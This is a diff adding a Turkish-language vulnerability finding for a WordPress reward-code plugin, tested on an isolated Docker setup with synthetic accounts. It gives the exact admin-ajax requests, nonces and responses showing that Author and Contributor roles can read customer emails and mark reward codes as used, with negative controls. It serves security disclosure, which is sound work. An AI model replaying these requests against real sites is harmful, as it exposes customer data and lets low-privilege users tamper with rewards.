@@ -1,0 +1,62 @@
+BULGU-01 — Ham HTTP kanıtı
+===========================
+Ortam: izole Docker (localhost:8080), sentetik kullanıcılar test_author (rol: author),
+test_contributor (rol: contributor), sentetik ödül kodu QRM-YZZKB8 (e-posta: sentetik@example.test).
+
+1) Yetki seviyesi doğrulama — kasiyer görünümüne (?view=kasa) erişim
+---------------------------------------------------------------------
+GET /wp-admin/admin.php?page=qrms-yf-odul&view=kasa
+
+  test_administrator -> HTTP 200, nonce üretildi (9696df9775)
+  test_author        -> HTTP 200, nonce üretildi (ab7261628a)
+  test_contributor   -> HTTP 200, nonce üretildi (9946eaee69)
+  test_subscriber    -> HTTP 403 "Sorry, you are not allowed to access this page."
+
+2) qrm_reward_admin_lookup — gerçek müşteri e-postasının ifşası
+---------------------------------------------------------------------
+POST /wp-admin/admin-ajax.php
+  action=qrm_reward_admin_lookup&nonce=ab7261628a&code=QRM-YZZKB8
+  (Cookie: test_author oturumu)
+
+Yanıt (HTTP 200):
+{"success":true,"found":true,"id":1,"code":"QRM-YZZKB8",
+ "email":"sentetik@example.test","status":"active","status_label":"Geçerli",
+ "valid":true,"can_mark_used":true,"discount_label":"Standart (%10 indirim)",
+ "created_at":"13.09.2026 05:13","expires_at":"13.10.2026 05:13","used_at":""}
+
+Aynı çağrı test_contributor nonce'uyla (9946eaee69) tekrarlandı — AYNI SONUÇ (e-posta ifşa oldu).
+
+3) qrm_reward_cashier_mark_used — kodun kullanıldı olarak işaretlenmesi
+---------------------------------------------------------------------
+POST /wp-admin/admin-ajax.php
+  action=qrm_reward_cashier_mark_used&nonce=9946eaee69&code=QRM-YZZKB8
+  (Cookie: test_contributor oturumu — rol: Contributor, WordPress'in en düşük
+   "içerik oluşturabilen" rolü, varsayılan olarak medya yükleyemez, yayın yapamaz)
+
+Yanıt (HTTP 200):
+{"success":true,"message":"Kod kullanıldı olarak işaretlendi.","code":"QRM-YZZKB8",
+ "status":"used","status_label":"Kullanıldı","discount_label":"Standart (%10 indirim)",
+ "used_at":"13.09.2026 05:15"}
+
+Veritabanı doğrulaması (wp_qrm_reward_codes):
+  code=QRM-YZZKB8, status=used, used_at=2026-09-13 05:15:18
+  -> AJAX yanıtı iddiası ile gerçek DB durumu birebir eşleşiyor: Contributor
+     rolündeki bir hesap gerçekten bir ödül kodunun durumunu kalıcı olarak değiştirdi.
+
+4) Negatif kontrol — Subscriber
+---------------------------------------------------------------------
+POST /wp-admin/admin-ajax.php action=qrm_reward_admin_lookup (test_subscriber cookie + author'ın nonce'u)
+  -> {"success":false,"message":"Bu işlem için yetkiniz yok."} (HTTP 200, veri yok)
+  Sayfa erişimi de HTTP 403. Subscriber doğru şekilde engelleniyor.
+
+5) Negatif kontrol — kimliksiz istek
+---------------------------------------------------------------------
+POST /wp-admin/admin-ajax.php action=qrm_reward_admin_lookup (cookie yok)
+  -> gövde: "0", HTTP 400 (WordPress çekirdeği: nopriv kaydı olmayan action, oturumsuz hiç tetiklenmez)
+
+SONUÇ: current_user_can('edit_posts') kontrolü, WordPress'in Author VE Contributor
+rollerinin İKİSİNDE de bulunan yerleşik bir capability'dir. Bu iki rol de:
+  a) müşteri e-postasını görüntüleyebiliyor,
+  b) gerçek bir ödül kodunun durumunu (kullanıldı) kalıcı olarak değiştirebiliyor.
+Doğrulanmış, gerçek (teorik değil) bir yetki tasarımı açığıdır — dinamik olarak
+uçtan uca (HTTP çağrısı -> DB durum değişikliği) kanıtlanmıştır.
